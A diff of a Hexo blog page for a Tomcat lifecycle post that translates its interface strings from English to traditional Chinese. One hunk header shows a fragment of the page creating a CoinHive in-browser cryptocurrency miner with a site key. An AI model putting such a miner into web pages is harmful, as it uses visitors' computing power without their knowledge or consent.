@@ -159,10 +159,10 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>Menu</li>
-                        <li>Tags</li>
+                        <li>菜單</li>
+                        <li>標籤</li>
                         
-                        <li>Friends</li>
+                        <li>友情鏈接</li>
                         
                         
                     </ul>
@@ -281,7 +281,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+    <link class="menu-list" tags="標籤" friends="友情鏈接" about="關於我"/>
 </nav>
       <div class="body-wrap"><article id="post-Tomcat源码阅读之组件生命周期" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -453,17 +453,17 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2018/04/16/Tomcat源码阅读之组件生命周期/">Tomcat源码阅读之组件生命周期</a></p>
-        <p><span>Author:</span><a href="/" title="Back to Homepage">Mu Xiaobai(慕小白)</a></p>
-        <p><span>Created:</span>2018-04-16, 10:39:09</p>
-        <p><span>Updated:</span>2018-04-20, 07:49:05</p>
+        <p><span>本文標題:</span><a href="/2018/04/16/Tomcat源码阅读之组件生命周期/">Tomcat源码阅读之组件生命周期</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主頁">Mu Xiaobai(慕小白)</a></p>
+        <p><span>發布時間:</span>2018-04-16, 10:39:09</p>
+        <p><span>最後更新:</span>2018-04-20, 07:49:05</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2018/04/16/Tomcat源码阅读之组件生命周期/" title="Tomcat源码阅读之组件生命周期">https://muxiaobai.github.io/2018/04/16/Tomcat源码阅读之组件生命周期/</a>
-            <span class="copy-path" data-clipboard-text="From https://muxiaobai.github.io/2018/04/16/Tomcat源码阅读之组件生命周期/　　By Mu Xiaobai(慕小白)" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>原始鏈接:</span><a class="post-url" href="/2018/04/16/Tomcat源码阅读之组件生命周期/" title="Tomcat源码阅读之组件生命周期">https://muxiaobai.github.io/2018/04/16/Tomcat源码阅读之组件生命周期/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://muxiaobai.github.io/2018/04/16/Tomcat源码阅读之组件生命周期/　　作者: Mu Xiaobai(慕小白)" title="點擊複製文章鏈接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+            <span>許可協議:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"姓名標示-非商業性-相同方式分享 4.0 國際"</a> 轉載請保留原文鏈接及作者。
         </p>
     </div>
 
@@ -490,7 +490,7 @@
 </article>
 
     <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
+    <strong class="toc-title">文章目錄</strong>
     <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Catalina中的load方法"><span class="toc-number">1.</span> <span class="toc-text">Catalina中的load方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Standard其他类中的方法Server-Service-Connector-Engine等"><span class="toc-number">2.</span> <span class="toc-text">Standard其他类中的方法Server Service Connector Engine等</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#其他容器的关系调用方法"><span class="toc-number">2.0.1.</span> <span class="toc-text">其他容器的关系调用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lifecycle类"><span class="toc-number">3.</span> <span class="toc-text">Lifecycle类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#模板方法"><span class="toc-number">3.1.</span> <span class="toc-text">模板方法</span></a></li></ol></li></ol>
 </div>
 <style>
@@ -500,10 +500,10 @@
     }
 </style>
 
-<input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+<input type="button" id="tocButton" value="隱藏目錄"  title="點擊按鈕隱藏或者顯示文章目錄">
 
 <script>
-    yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    yiliaConfig.toc = ["隱藏目錄", "顯示目錄", !!"false"];
 </script>
 
 
@@ -548,15 +548,15 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/04/17/Tomcat源码阅读之URL请求解析/" title="Pre: Tomcat源码阅读之URL请求解析">
+            <a href="/2018/04/17/Tomcat源码阅读之URL请求解析/" title="上一篇: Tomcat源码阅读之URL请求解析">
                 <i class="fa fa-angle-left"></i>
             </a>
         
 
-        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/04/16/Tomcat源码阅读之从server-xml看组件关系/" title="Next: Tomcat源码阅读之从server.xml看组件关系">
+            <a href="/2018/04/16/Tomcat源码阅读之从server-xml看组件关系/" title="下一篇: Tomcat源码阅读之从server.xml看组件关系">
                 <i class="fa fa-angle-right"></i>
             </a>
         
@@ -579,14 +579,14 @@
                 2016-2018 Mu Xiaobai(慕小白)
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="快速、簡潔且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="簡而不減 Hexo 雙欄博客主題  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >Site Visitors: 
+                        <span id="site-visit" >本站到訪數: 
                             <span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
@@ -596,7 +596,7 @@
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit">Page Hits: 
+                        <span id="page-visit">本頁閱讀量: 
                             <span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
@@ -661,9 +661,9 @@ var miner = new CoinHive.Anonymous('4vmXkBOL0LsDsFLNY9UqbMlRxhGnXkAR', {throttle
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="返回頂部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看評論"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="轉到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
